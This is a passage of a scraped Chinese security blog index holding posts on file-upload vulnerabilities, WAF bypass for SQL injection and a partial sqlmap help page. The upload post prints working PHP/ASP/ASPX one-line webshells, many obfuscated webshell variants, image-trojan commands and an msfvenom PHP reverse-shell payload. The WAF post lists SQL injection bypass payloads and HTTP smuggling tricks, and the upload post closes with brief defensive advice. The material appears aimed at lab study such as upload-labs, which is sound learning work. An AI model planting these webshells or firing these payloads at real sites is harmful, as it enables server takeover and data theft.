PHP文件包含漏洞（利用phpinfo）","categories":[{"name":"OWASP-TOP10","slug":"OWASP-TOP10","permalink":"https://chirec.github.io/categories/OWASP-TOP10/"}],"tags":[{"name":"OWASP-TOP10","slug":"OWASP-TOP10","permalink":"https://chirec.github.io/tags/OWASP-TOP10/"}]},{"title":"'文件上传总结'","slug":"Upload-Files","date":"2019-04-19T11:56:07.000Z","updated":"2019-04-25T12:44:37.369Z","comments":true,"path":"2019/04/19/Upload-Files/","link":"","permalink":"https://chirec.github.io/2019/04/19/Upload-Files/","excerpt":"1. WebShell1.1 什么是ShellShell是系统的用户界面，提供了用户与内核进行交互操作的一种接口。它接收用户输入的命令并把它送入内核去执行。因为系统内核使我们不能直接操作的，shell就给我们提供了一个接口，通过shell我们可以把命令送入到内核。shell管理用户与操作系统之间的交互：等待你输入，向操作系统解释你的输入，并且处理各种各样的操作系统的输出结果。传统意义上的shell指的是命令行式的shell，以后如果不特别注明，shell是指命令行式的shell。表示用户拥有的权限，不同的shell权限不同 1.2 WebShell黑客在入侵了一个网站后，通常会留下一个asp或php后门文件与网站web服务器进行交互，得到一个命令执行环境，以达到控制网站服务器的目的。这个后门文件就是所谓的webshell。","text":"1. WebShell1.1 什么是ShellShell是系统的用户界面，提供了用户与内核进行交互操作的一种接口。它接收用户输入的命令并把它送入内核去执行。因为系统内核使我们不能直接操作的，shell就给我们提供了一个接口，通过shell我们可以把命令送入到内核。shell管理用户与操作系统之间的交互：等待你输入，向操作系统解释你的输入，并且处理各种各样的操作系统的输出结果。传统意义上的shell指的是命令行式的shell，以后如果不特别注明，shell是指命令行式的shell。表示用户拥有的权限，不同的shell权限不同 1.2 WebShell黑客在入侵了一个网站后，通常会留下一个asp或php后门文件与网站web服务器进行交互，得到一个命令执行环境，以达到控制网站服务器的目的。这个后门文件就是所谓的webshell。 2. 木马分类2.1 一句话木马一句话木马是Webshell的一种，由于这类Webshell代码比较少，往往只有一行代码，所以就被称为一句话木马。一句话木马虽然代码简单，但是结合中国菜刀、蚁剑等WebShell管理工具，它们的功能却是非常的强大。 2.1.1 一句话木马工作原理在PHP、ASP、ASPX中都有可以执行外部程序的函数，一句话木马就是通过这些函数来工作的，由页面传输待执行的命令，函数在远程执行命令。 PHP一句话木马1&lt;?php eval($_POST[&apos;cmd&apos;]);?&gt; ASP一句话木马1&lt;% eval request(&apos;cmd&apos;)%&gt; ASPX一句话木马1&lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;cmd&quot;])%&gt; 2.1.2 特点代码量少，体积小，不易被发现，配合WebShell管理工具功能强大。 2.2 小马2.2.1 特点代码量较少，体积较小，基本功能(文件管理、命令执行、数据库管理)都有 2.3 大马2.2.1 特点代码量多，体积大，易被发现，功能多 3. 修改Apache权限WebShell的权限和Apache权限有关，可以通过限制Apache权限降低WebShell的权限。 3.1 Windows为Apache添加用户 1user Apache password /add 打开服务管理 找到Apache-属性-登录-此账户 登录Apache用户 3.2 Linux不使用源码安装Apache就是最低权限 4. 文件上传4.1 文件上传原理在文件上传的功能处，若服务端脚本语言未对上传的文件进行严格验证和过滤，导致恶意用户上传恶意的脚本文件时，就有可能获取执行服务端命令的能力，这就是文件上传漏洞。 文件上传漏洞对Web应用来说是一种非常严重的漏洞。一般情况下，Web应用都会允许用户上传一些文件，如头像、附件等信息，如果Web应用没有对用户上传的文件进行有效的检查过滤，那么恶意用户就会上传一句话木马等Webshell，从而达到控制Web网站的目的。 4.1.1 文件上传漏洞高危触发点相册、头像上传视频、照片分享附件上传文件管理器 4.2 文件上传检测4.2.1 JavaScript检测检测文件后缀名绕过方式：1.关闭JS解析2.在白名单中加上要上传的文件类型3.破坏JS4.拦截数据包修改文件名 upload-labs第1关 4.2.2 MIME检测检测content-type绕过方式：抓包修改content-type image/png image/jpeg image/bmp 4.2.3 扩展名检测4.2.3.1 使用黑名单检测：{php|php3|php4|asp|html|jsp} 4.2.3.2 绕过方式：4.2.3.2.1 找一种不在黑名单中的，可以被正常解析的文件后缀名4.2.3.2.2 后缀名大小写4.2.3.2.3 利用windows特性绕过检测:4.2.3.2.3.1 Windows+PHP 叠加特性(upload-labs第4关)12345&quot; = .\\&gt; = ?\\&lt; = * 第一步操作可以向服务器中写一个0字节的文件 1test.php:.jpg 第二步上传时，修改文件名为test.&gt;&gt;&gt;或test.&lt; 4.2.3.2.3.2 Windows文件名特性(upload-labs第6,7,9关)点或者空格结尾的文件再保存的时候，点和空格会被删除shell.php.(空格)或shell.php&nbsp;(空格) 4.2.3.2.3.3 Windows文件流(NTFS)特性(upload-labs第8关) 4.2.3.2.4 使用00截断 (PHP版本)php版本要小于5.3.4，5.3.4及以上已经修复该问题；magic_quotes_gpc需要为OFF状态，在PHP.ini中修改 4.2.3.2.4.1 path通过GET方式传输(upload-lab第11关)抓包修改URL，在末尾加上可以解析的扩展名和%00进行截断 4.2.3.2.4.2 path通过POST方式传输(upload-lab第12关)抓包-在保存路径后添加可以解析的扩展名并使用%00进行截断，要将%00选中Ctrl+Shift+U转为十六进制。 4.2.3.2.5 通过修改解析规则绕过黑名单检测创建.htaccess文件 123&lt;FilesMatch &quot;test.io&quot;&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt; 上传.htaccess文件，再上传test.io，test.io被解析为php 4.2.4 文件内容检测(文件头或魔术头)(upload-labs第13关) 格式 文件头 JPG FF D8 FF E0 00 10 4A 46 49 46 GIF 47 49 46 38 39 61 PNG 89 50 4E 47 Windows Bitmap (bmp) 42 4D TIFF (tif) 49 49 2A 00 CAD (dwg) 41 43 31 30 Adobe Photoshop (psd) 38425053 Rich Text Format (rtf) 7B5C727466 MS Word/Excel (xls.or.doc) D0CF11E0 MS Access (mdb) 5374616E64617264204A ZIP Archive (zip) 504B0304 RAR Archive (rar) 52617221 Wave (wav) 57415645 AVI (avi) 41564920 Real Media (rm) 2E524D46 MPEG (mpg) 000001BA MPEG (mpg) 000001B3 Quicktime (mov) 6D6F6F76 Adobe Acrobat (pdf) 255044462D312E Windows Media (asf) 3026B2758E66CF11 MIDI (mid) 4D546864 生成图片木马 1copy test.jpg/b+test.php/a shell.jpg 使用edjpgcom.exe 将图片拖拽到.exe上 需要和其他漏洞(解析漏洞、文件包含)结合使用 4.2.5 文件渲染检测调用API 或函数去进行文件加载测试常见的是图像渲染测试，再变态点的甚至是进行二次渲染(后面会提到) 对文件加载检测的攻击一般就两种方式，一个是渲染测试绕过，另一个是攻击文件加载器自身。 4.2.5.1 渲染测试绕过先用 GIMP 对一张图片进行代码注入 用 winhex 看数据可以分析出这类工具的原理是 在不破坏文件本身的渲染情况下找一个空白区进行填充代码 一般是图片的注释区 upload-labs第16关 4.2.5.2 攻击文件加载器二次渲染基本上没法绕过，只能对文件加载器进行攻击二次渲染相当于是把原本属于图像数据的部分选取出来，再用API 或函数进行重新渲染，在这个过程中非图像数据的部分直接就隔离开了 对文件加载器进行攻击，常见的就是溢出攻击，上传恶意文件后，服务上的文件加载器进行加载测试时，被触发攻击执行shellcode比如 access/mdb 溢出(Microsoft Jet Engine MDB File溢出的漏洞，该漏洞是由于access在加载mdb文件时，处理不当，产生的shellcode执行，参考链接:https://blog.csdn.net/kendyhj9999/article/details/18738435) Magic image 4.2.6 条件竞争线程编程中，为了保证数据操作的一致性，操作系统引入了锁机制，用于保证临界区代码的安全。通过锁机制，能够保证在多核多线程环境中，在某一个时间点上，只能有一个线程进入临界区代码，从而保证临界区中操作数据的一致性。 临界区指的是一个访问共用资源（例如：共用设备或是共用存储器）的程序片段，而这些共用资源又无法同时被多个线程访问的特性。 竞争条件发生在多个线程同时访问同一个共享代码、变量、文件等没有进行锁操作或者同步操作的场景中。 upload-labs第17关 4.2.7 写提交按钮有些上传页面没有提交按钮，可以用HTML编辑From表单，添加提交按钮 5. 解析漏洞 5.1 IIS5.1.1 版本：5.x-6.x目录解析漏洞：以asp/asa等结尾的目录，其目录下的文件均可被解析 文件名解析漏洞：以.asp/asa;*.png或;*.jpg结尾的文件均可被解析 IIS应用层漏洞：以asa、cer、cdx结尾的文件均可被解析 5.1.2 版本：7.5(配置不当引起)在当前文件中，有IIS能够解析的扩展名(asp/aspx)，这个文件可被解析 a.aspx.a a.aspx.jpg.jpg…jpg 5.1.3 版本：IIS 7.0/IIS 7.5在默认Fast-CGI开启状况下,上传一个名字为wooyun.jpg，内容为 1&lt;?PHP fputs(fopen(&apos;shell.php&apos;,&apos;w&apos;),&apos;&lt;?php eval($_POST[cmd])?&gt;&apos;);?&gt; 的文件，然后访问wooyun.jpg/.php,在这个目录下就会生成一句话木马 shell.php x.asp%00.jpg 5.1.4 IIS PUT写入漏洞服务器配置不当造成，因为开启Webdav，使应用程序可直接对Web Server进行读写，同时IIS中又配置目录可写，便产生很严重的问题。 5.2 Apache5.2.1 文件名移位解析原理：Apache在解析文件过程中，从右向左开始判断后缀名，遇到不认识的后缀名，会向左移动一位再做判断 test.php.php123.cdd 先解析.cdd不认识，再解析.php123，再解析php 服务器本身的漏洞 5.2.2 文件名中包含PHP就会解析(配置不当)再配置文件中添加一行配置： 1AddHander php5-script .php test2.php.jpg 5.2.3 添加扩展名(配置不当)1AddType application/x-httpd-php .jpg 即使是.jpg文件也能被解析 5.3 Nginx5.3.1 版本&lt;8.0.3 畸形解析漏洞在默认Fast-CGI开启状况下,上传一个名字为wooyun.jpg，内容为 1&lt;?PHP fputs(fopen(&apos;shell.php&apos;,&apos;w&apos;),&apos;&lt;?php eval($_POST[cmd])?&gt;&apos;);?&gt; 的文件，然后访问wooyun.jpg/.php,在这个目录下就会生成一句话木马 shell.php 5.3.2 版本&lt;8.0.3 空字节代码执行漏洞上传文件是图片木马，在访问时，URL中图片后缀名后面加上%00.php可以正常解析 xxx.jpg%00.php 5.3.3 fix_pathinfo(配置不当)在配置文件中设置fix_pathinfo这个参数(开启，并设置相应的值)，服务器中就会出现各种解析漏洞(CGI解析漏洞) 123/1.jpg/1.php/1.jpg%00.php/1.jpg/%20\\1.php 6. Getshell条件6.1 木马可上传可直接解析的后缀名、图片木马 6.2 木马可解析后缀名可直接解析，知道文件的路径 图片木马 结合其他漏洞(解析漏洞或文件包含)，知道文件路径 6.3 木马可访问文件路径获取方法： 上传正常图片，并且显示该图片，直接看图片路径扫目录信息泄露--列目录 7.一句话木马变形7.1 使用字符串隐藏assert、eval等函数1$a =str_replace(&quot;x&quot;,&quot;&quot;,”axsxxsxexrxxt”);$a($_POST[“code”]); 用字符串隐藏assert方法，并且利用它加上动态传入参数的方式构造后门。 7.2 将函数和执行命令都作为请求参数123$_GET[‘a’]($_GET[‘b’]);?a=assert&amp;b=phpinfo();完全利用动态参数传入的方式构造后门，将敏感函数和执行的命令动态传入，效果如变形二。 7.3 preg_replace函数12($code = $_POST[‘code’]) &amp;&amp; @preg_replace(‘/ad/e’,’@’.str_rot13(‘riny’).&apos;($code)’, ‘add’); 7.4 自定义函数1234$fun=creat_function(&apos;&apos;,$_POST[&apos;a&apos;]);$fun();a=phpinfo(); 7.5 回调函数 call_user_func()1@call_user_func(assert,$_POST[&apos;a&apos;]); 7.6 file_put_contents函数1234&lt;?php$test=&apos;&lt;?php $a=$_POST[&quot;cmd&quot;];assert($a); ?&gt;&apos;;file_put_contents(&quot;shell.php&quot;, $test);?&gt; 7.7 PHP变量函数1234&lt;?php $a = &quot;eval&quot;;$a(@$_POST[&apos;a&apos;]); ?&gt; 7.8 PHP可变变量12345&lt;?php$bb=&quot;eval&quot;;$a=&quot;bb&quot;;$$a($_POST[&apos;a&apos;]);?&gt; 7.9 str_replace函数1234&lt;?php$a=str_replace(&quot;Waldo&quot;, &quot;&quot;, &quot;aWaldossert&quot;);$a(@$_POST[&apos;a&apos;]);?&gt; 7.10 base64_decode函数12345base64_decode函数&lt;?php$a=base64_decode(&quot;ZXZhbA==&quot;)$a($_POST[&apos;a&apos;]);?&gt; 7.11 .操作符123456&lt;?php$a=&quot;e&quot;.&quot;v&quot;;$b=&quot;a&quot;.&quot;l&quot;;$c=$a.$b;$c($_POST[&apos;a&apos;]);?&gt; 7.12 parse_str函数，将查询字符串解析到变量中123456&lt;?php$str=&quot;a=eval&quot;;parse_str($str);//$a=eval$a($_POST[&apos;a&apos;]);?&gt; 7.13 array_filter函数，用回调函数过滤数组中的元素123$e=$_REQUEST[&apos;e&apos;];$arr = array($_POST[&apos;pass&apos;],);array_map($e, $arr); eval不能回调，assert可以 使用菜刀连接 \\e=assert\\ 7.14 array_map函数将函数作用到数组中的每个值上，做相应的处理，并返回带有新值的数组： 123$e = $_REQUEST[&apos;e&apos;];$arr = array($_POST[&apos;pass&apos;],);array_map($e, $arr); 7.15 uasort函数使用自定义的比较函数对数组$arr中的元素按键值进行排序 123$e=$_REQUEST[&apos;e&apos;];$arr=array(&apos;test&apos;,$_REQUEST[&apos;pass&apos;]);uasort($arr,$e); PHP版本&gt;5.4 7.16 加密类变形12345678910111213if(isset($_POST[&apos;com&apos;])&amp;&amp;md5($_POST[&apos;com&apos;])== &apos;202cb962ac59075b964b07152d234b70&apos;&amp;&amp; isset($_POST[&apos;content&apos;])) $content = strtr($_POST[&apos;content&apos;], &apos;-_,&apos;, &apos;+/=&apos;);eval(base64_decode($content));eval($_POST[&quot;cmd&quot;])http://www.target.com/shell.php cmdcontent=JF9QT1NUWyJjbWQiXQ== com=123 7.17 变量拼接类变形12&lt;?php $sF=&quot;PCT4BA6ODSE_&quot;;$s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$sF[10]);$s22=$&#123;strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[2])&#125;[&apos;n985de9&apos;];if(isset($s22))&#123;eval($s21($s22));&#125;?&gt; 7.18 加密拼接1&lt;?php $_uU=chr(99).chr(104).chr(114);$_cC=$_uU(101).$_uU(118).$_uU(97).$_uU(108).$_uU(40).$_uU(36).$_uU(95).$_uU(80).$_uU(79).$_uU(83).$_uU(84).$_uU(91).$_uU(49).$_uU(93).$_uU(41).$_uU(59);$_fF=$_uU(99).$_uU(114).$_uU(101).$_uU(97).$_uU(116).$_uU(101).$_uU(95).$_uU(102).$_uU(117).$_uU(110).$_uU(99).$_uU(116).$_uU(105).$_uU(111).$_uU(110);$_=$_fF(&quot;&quot;,$_cC);@$_();?&gt; 1234567891011121314&lt;?$__C_C=&quot;WlhaaGJDZ2tYMUJQVTFSYmVGMHBPdz09&quot;;$__P_P=&quot;abcdefghijklmnopqrstuvwxyz&quot;;$__X_X=&quot;123456789&quot;;$__O_O=$__X_X[5].$__X_X[3].&quot;_&quot;;$__B_B=$__P_P&#123;1&#125;.$__P_P[0].$__P_P[18].$__P_P[4];$__H_H=$__B_B.$__O_O.$__P_P[3].$__P_P[4].$__P_P[2].$__P_P[14].$__P_P[3].$__P_P[4];$__E_E=$__P_P[4].$__P_P[21].$__P_P[0].$__P_P[11];$__F_F=$__P_P[2].$__P_P[17].$__P_P[4].$__P_P[0].$__P_P[19].$__P_P[4];$__F_F.=&apos;_&apos;.$__P_P[5].$__P_P[20].$__P_P[13].$__P_P[2].$__P_P[19].$__P_P[8].$__P_P[14].$__P_P[13];$_[00]=$__F_F(&apos;$__S_S&apos;,$__E_E.&apos;(&quot;$__S_S&quot;);&apos;);@$_[00]($__H_H($__H_H($__C_C)));//解码后即==&gt; eval($_POST[x]);?&gt; 7.19 MSF生成网页木马1.生成木马 1msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.126.126 lport=12600 -f raw &gt;./shell.php 12345set payload php/meterpreter/reverse_tcpshow optionsset lhostset lportexploit -j 7.20 Weevely生成网页木马1python weevely.py generate password path 终端 1python weevely.py url password 8. 文件上传防御1.使用白名单限制上传类型黑名单可以使用各种方法进行绕过 2.使用最新版本的IIS、Apache、Nginx 3.对上传文件名进行改写 4.检查HTTP Header中的Content-Type、检查文件上传路径 5.分析文件头和文件尾 6.对图片进行渲染，最好二次渲染，并对API和函数进行加固，防止溢出 7.设置文件夹权限根据需求将文件上传的目录设置为不可执行 8.尽可能让上传的文件的路径不可知，将路径保存到数据库中，在需要的时候再进行读取 9.限制上传文件的大小 10.单独设置文件服务器的域名 9. 参考[1] Web条件竞争 [2] 解析漏洞整理 [3] 文件上传漏洞是什么？要怎样防御文件上传的漏洞攻击？","categories":[],"tags":[]},{"title":"'绕过WAF(自闭教程)'","slug":"Play-with-WAF","date":"2019-04-17T12:46:23.000Z","updated":"2019-04-28T03:03:22.363Z","comments":true,"path":"2019/04/17/Play-with-WAF/","link":"","permalink":"https://chirec.github.io/2019/04/17/Play-with-WAF/","excerpt":"1. WAF1.1 WAF介绍WAF是Web Application Firewall的简称。中文名为Web应用防护系统，也称网站应用级入侵防御系统。","text":"1. WAF1.1 WAF介绍WAF是Web Application Firewall的简称。中文名为Web应用防护系统，也称网站应用级入侵防御系统。 1.2 WAF作用1.2.1 网络层防护拦截DDOS攻击、防御SYN Flood、防御Ack Flood、防御Http/Https Flood 1.2.2 应用层防护URL黑白名单、HTTP协议规范、防御注入攻击、防御XSS攻击、防御XXE 1.3 分类代码WAF：规则写在代码中 软件WAF：实时监听端口(服务) 硬件WAF：专门的硬件设备 代理流量 分析流量 网络镜像 云WAF：流量传到检测节点中做检测 1.4 工作流程1.4.1 身份验证白名单(IP、cookie、useragent、referer)黑名单 1.4.2 数据包解析1.4.3 匹配规则ACL(访问控制列表) 2.Bypass常用方法2.1 大小写1select * from users where id=&apos;1 &apos; uNion SelEct 1,2,3,4 --+ 2.2 替换关键字(关键字重复写)1select * from users where id=1 ununionion selselectect 2.3 编码2.3.1 URL编码1select * from users where id=1 %75nion select 2.3.2 二次URL编码将URL编码两次 2.3.3 错误URL编码12union select password from users where id=1u%nion sel%ect password fr%om users wh%ere id=1 在注入关键词处加上%，WAF会将其取出 2.3.4 Unicode编码12union select password from users where id=1%u0075%u006e%u0069%u006f%u006e select password from users where id=1 Unicode编码 2.3.5 Nibble编码Nibble编码是针对URL编码的%后两位进行二次编码的一种方法。根据编码位置不同，被分为First Nibble、Second Nibble以及Double Nibble三种。 Type Transformation of %61 Result First Nibble 6 = %36 %%361 Second Nibble 1 = %31 %6%31 Double Nibble 6 = %36 1 = %31 %%36%31 2.3.6错误16进制编码 Hex Character Conversion Decimal %61 6*16+1 97 %2ú 2*16+65 97 2.4 内联注释/* */ 1select * from users where id=1 union/**/ 2.5 等价函数替换123version @@versionmid substr substring@@datadir datadir() 2.6 特殊符号123456789101112+#%23--+\\\\\\\\||select`version()`@ 用户自定义变量@@ 系统变量se||lect%df宽字节注释符+%0a绕过 2.7 内联注释加！1/*!union*/ 2.8 缓冲区溢出1?id=1 and (select 1)=(select 0xAAAAAAAAAAAA*1000) union select 1,2 verion(),4,5,database(),8,9,10,11,12,13,14,15,16,17,18 0xA*1000指有1000个A 2.9 mysql特性绕过123= 等于:= 赋值@ @+变量名可直接调用 2.10 隐私类型转换12select &apos;a&apos;=0;select &apos;1admin&apos;=1; 2.11 综合探索内联注释黑魔法 1select&#123;x user&#125;from&#123;x mysql.user&#125; 换行符绕过：%23%0a %2d%2d%0a 12select * from admin where id=1[1] union [2]select [3]1,user()[4]from[5]admin//[]表示检测点 2.11.1[1]： 1/**/ /*!50000union*/ 12空白 %09 %0a %0b %0c %0d %20id=1%0bunion select 1,user() from admin 12浮点数形式id=1.0union select 1,user() from admin 121E0id=1E0union select 1,user() from admin 12\\id=\\Nunion select 1,user() from admin 2.11.2[2]： 1空白 1注释符 12括号id=1 union(select &apos;test&apos;,(select user()from admin limit 0,1)) 2.11.3[3]： 1空白 1注释符 1234567其他字符！ %21+ %2b- %2d@ %40~ %7eid=1 union select~1,user(),version() from admin 12括号id=1 union select(1),user(),version() from admin 12内联注释id=1 union /*!500000select*/ 1,user(),version() from admin 12&#123;&#125;id=1 union select&#123;x 1&#125;,user(),version() from admin 12&quot;&quot;id=1 union select&quot;1&quot;,user(),version() from admin 12\\Nid=1 union select\\N,user(),version() from admin 2.11.4[4]： 1空白 1注释符 123其他字符` %60id=1 union select 1,user(),version()`from admin` 1内联注释 1括号 12加字母id=1 union select 1,user(),version()Afrom admin 1浮点数、1E0、\\N 2.11.5[5]： 1空白 1注释符 123其他符号中文破折号id=1 union select 1,user(),version() from——admin 1内联注释 12&#123;&#125;id=1 union select 1,user(),version() from&#123;x admin&#125; 1() 1 2 2 1 2 2 1 2 2 2.12 空白 RDBMS Allowed whitespaces SQLite 3 0A,0D,0C,09,20 MySQL 5 09,0A,0B,0C,0D,A0,20 Oracle 11g 00,09,0A,0B,0C,0D,20 MSSQL 2008 01,02,03,04,05,06,07,08,09,0A,0B,0C,0D,0E,0F,10,11,12,13,14,15,16,17,18,19,1A,1B,1C,1D,1E,1F,20,25 2.13 特殊位置代替空格科学计数法(1e0,.)数学计算(+-*/)特殊字符(\\N)注释符(/**/) 2.14 无空格的查询1?id=1e0and&#123;``select(left(database(),1))&#125; 3. 基于HTTP协议的绕过方式OWASP AppSec EuropeWAF Bypass Techniques-Using HTTP Standard and Web Servers’ Behaviour -- Soroush Dalili来源：漏洞银行丨一般人我不告诉的WAF绕过新姿势-1337G丨咖面74期 3.1 基于HTTP0.9协议的绕过方式3.2 HTTP隧道传输/HTTP pipline 通过BP拦包，在一个请求下添加多个请求，注意需要修改 12Connection:keep-aliveContent-Length: 3.3 畸形包 由于c=2&amp;d=2后面的内容WAF并能不识别，所以GET后面的Payload没有被WAF拦截掉 3.4 分块传输/Chunked Transfer通过使用HTTP头Transfer-Encoding:chunked设置达到分割参数的效果在HTTP/1.1下使用 奇数行表示下一行的数据长度，使用16机制表示偶数行表示传输的数据在最后一行写0，并在0后写入多个回车0后没有回车会没有响应 3.5 协议未覆盖以下四种常见的content-type类型，我们可以尝试互相替换尝试绕过WAF过滤机制。 1234Content-Type:text/html;charset=UTF-8Content-Type:application/json;charset=utf-8Content-Type:application/x-www-form-urlencoded;charset=utf-8Content-Type:multipart/form-data;boundary=something 注：如图常见的绕过方式为使用multipart/form-data标签，并把name设为参数名内容写入注入语句。 .参考[1] 漏洞银行丨一般人我不告诉的WAF绕过新姿势-1337G丨咖面74期 [2] Additional notes on “A Forgotten HTTP Invisibility Cloak” talk!","categories":[],"tags":[]},{"title":"'Sqlmap使用手册(未完成)'","slug":"Sqlmap-Usage","date":"2019-04-14T09:03:02.000Z","updated":"2019-07-04T11:24:36.039Z","comments":true,"path":"2019/04/14/Sqlmap-Usage/","link":"","permalink":"https://chirec.github.io/2019/04/14/Sqlmap-Usage/","excerpt":"为了更好的学习sqlmap，尝试看官方文档并翻译官方文档。由于对网络方面的单词不熟悉而且英文水平有限，所以翻译并不准确。","text":"为了更好的学习sqlmap，尝试看官方文档并翻译官方文档。由于对网络方面的单词不熟悉而且英文水平有限，所以翻译并不准确。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259Usage: python sqlmap.py [options]Options: -h, --help Show basic help message and exit -hh Show advanced help message and exit --version Show program&apos;s version number and exit -v VERBOSE Verbosity level: 0-6 (default 1) Target: At least one of these options has to be provided to define the target(s) -d DIRECT Connection string for direct database connection -u URL, --url=URL Target URL (e.g. &quot;http://www.site.com/vuln.php?id=1&quot;) -l LOGFILE Parse target(s) from Burp or WebScarab proxy log file -x SITEMAPURL Parse target(s) from remote sitemap(.xml) file -m BULKFILE Scan multiple targets given in a textual file -r REQUESTFILE Load HTTP request from a file -g GOOGLEDORK Process Google dork results as target URLs -c CONFIGFILE Load options from a configuration INI file Request: These options can be used to specify how to connect to the target URL --method=METHOD Force usage of given HTTP method (e.g. PUT) --data=DATA Data string to be sent through POST (e.g. &quot;id=1&quot;) --param-del=PARA.. Character used for splitting parameter values (e.g. &amp;) --cookie=COOKIE HTTP Cookie header value (e.g. &quot;PHPSESSID=a8d127e..&quot;) --cookie-del=COO.. Character used for splitting cookie values (e.g. ;) --load-cookies=L.. File containing cookies in Netscape/wget format --drop-set-cookie Ignore Set-Cookie header from response --user-agent=AGENT HTTP User-Agent header value --random-agent Use randomly selected HTTP User-Agent header value --host=HOST HTTP Host header value --referer=REFERER HTTP Referer header value -H HEADER, --hea.. Extra header (e.g. &quot;X-Forwarded-For: 127.0.0.1&quot;) --headers=HEADERS Extra headers (e.g. &quot;Accept-Language: fr\\nETag: 123&quot;) --auth-type=AUTH.. HTTP authentication type (Basic, Digest, NTLM or PKI) --auth-cred=AUTH.. HTTP authentication credentials (name:password) --auth-file=AUTH.. HTTP authentication PEM cert/private key file --ignore-code=IG.. Ignore (problematic) HTTP error code (e.g. 401) --ignore-proxy Ignore system default proxy settings --ignore-redirects Ignore redirection attempts --ignore-timeouts Ignore connection timeouts --proxy=PROXY Use a proxy to connect to the target URL --proxy-cred=PRO.. Proxy authentication credentials (name:password) --proxy-file=PRO.. Load proxy list from a file --tor Use Tor anonymity network --tor-port=TORPORT Set Tor proxy port other than default --tor-type=TORTYPE Set Tor proxy type (HTTP, SOCKS4 or SOCKS5 (default)) --check-tor Check to see if Tor is used properly --delay=DELAY Delay in seconds between each HTTP request --timeout=TIMEOUT Seconds to wait before timeout connection (default 30) --retries=RETRIES Retries when the connection timeouts (default 3) --randomize=RPARAM Randomly change value for given parameter(s) --safe-url=SAFEURL URL address to visit frequently during testing --safe-post=SAFE.. POST data to send to a safe URL --safe-req=SAFER.. Load safe HTTP request from a file --safe-freq=SAFE.. Test requests between two visits to a given safe URL --skip-urlencode Skip URL encoding of payload data --csrf-token=CSR.. Parameter used to hold anti-CSRF token --csrf-url=CSRFURL URL address to visit for extraction of anti-CSRF token --force-ssl Force usage of SSL/HTTPS --hpp Use HTTP parameter pollution method --eval=EVALCODE Evaluate provided Python code before the request (e.g. &quot;import hashlib;id2=hashlib.md5(id).hexdigest()&quot;) Optimization: These options can be used to optimize the performance of sqlmap -o Turn on all optimization switches --predict-output Predict common queries output --keep-alive Use persistent HTTP(s) connections --null-connection Retrieve page length without actual HTTP response body --threads=THREADS Max number of concurrent HTTP(s) requests (default 1) Injection: These options can be used to specify which parameters to test for, provide custom injection payloads and optional tampering scripts -p TESTPARAMETER Testable parameter(s) --skip=SKIP Skip testing for given parameter(s) --skip-static Skip testing parameters that not appear to be dynamic --param-exclude=.. Regexp to exclude parameters from testing (e.g. &quot;ses&quot;) --dbms=DBMS Force back-end DBMS to provided value --dbms-cred=DBMS.. DBMS authentication credentials (user:password) --os=OS Force back-end DBMS operating system to provided value --invalid-bignum Use big numbers for invalidating values --invalid-logical Use logical operations for invalidating values --invalid-string Use random strings for invalidating values --no-cast Turn off payload casting mechanism --no-escape Turn off string escaping mechanism --prefix=PREFIX Injection payload prefix string --suffix=SUFFIX Injection payload suffix string --tamper=TAMPER Use given script(s) for tampering injection data Detection: These options can be used to customize the detection phase --level=LEVEL Level of tests to perform (1-5, default 1) --risk=RISK Risk of tests to perform (1-3, default 1) --string=STRING String to match when query is evaluated to True --not-string=NOT.. String to match when query is evaluated to False --regexp=REGEXP Regexp to match when query is evaluated to True --code=CODE HTTP code to match when query is evaluated to True --text-only Compare pages based only on the textual content --titles Compare pages based only on their titles Techniques: These options can be used to tweak testing of specific SQL injection techniques --technique=TECH SQL injection techniques to use (default &quot;BEUSTQ&quot;) --time-sec=TIMESEC Seconds to delay the DBMS response (default 5) --union-cols=UCOLS Range of columns to test for UNION query SQL injection --union-char=UCHAR Character to use for bruteforcing number of columns --union-from=UFROM Table to use in FROM part of UNION query SQL injection --dns-domain=DNS.. Domain name used for DNS exfiltration attack --second-url=SEC.. Resulting page URL searched for second-order response --second-req=SEC.. Load second-order HTTP request from file Fingerprint: -f, --fingerprint Perform an extensive DBMS version fingerprint Enumeration: These options can be used to enumerate the back-end database management system information, structure and data contained in the tables. Moreover you can run your own SQL statements -a, --all Retrieve everything -b, --banner Retrieve DBMS banner --current-user Retrieve DBMS current user --current-db Retrieve DBMS current database --hostname Retrieve DBMS server hostname --is-dba Detect if the DBMS current user is DBA --users Enumerate DBMS users --passwords Enumerate DBMS users password hashes --privileges Enumerate DBMS users privileges --roles Enumerate DBMS users roles --dbs Enumerate DBMS databases --tables Enumerate DBMS database tables --columns Enumerate DBMS database table columns --schema Enumerate DBMS schema --count Retrieve number of entries for table(s) --dump Dump DBMS database table entries --dump-all Dump all DBMS databases tables entries --search Search column(s), table(s) and/or database name(s) --comments Check for DBMS comments during enumeration -D DB DBMS database to enumerate -T TBL DBMS database table(s) to enumerate -C COL DBMS database table column(s) to enumerate -X EXCLUDE DBMS database identifier(s) to not enumerate -U USER DBMS user to enumerate --exclude-sysdbs Exclude DBMS system databases when enumerating tables --pivot-column=P.. Pivot column name --where=DUMPWHERE Use WHERE condition while table dumping --start=LIMITSTART First dump table entry to retrieve --stop=LIMITSTOP Last dump table entry to retrieve --first=FIRSTCHAR First query output word character to retrieve --last=LASTCHAR Last query output word character to retrieve --sql-query=QUERY SQL statement to be executed --sql-shell Prompt for an interactive SQL shell --sql-file=SQLFILE Execute SQL statements from given file(s) Brute force: These options can be used to run brute force checks --common-tables Check existence of common tables --common-columns Check existence of common columns User-defined function injection: These options can be used to create custom user-defined functions --udf-inject Inject custom user-defined functions --shared-lib=SHLIB Local path of the shared library File system access: These options can be used to access the back-end database management system underlying file system --file-read=FILE.. Read a file from the back-end DBMS file system --file-write=FIL.. Write a local file on the back-end DBMS file system --file-dest=FILE.. Back-end 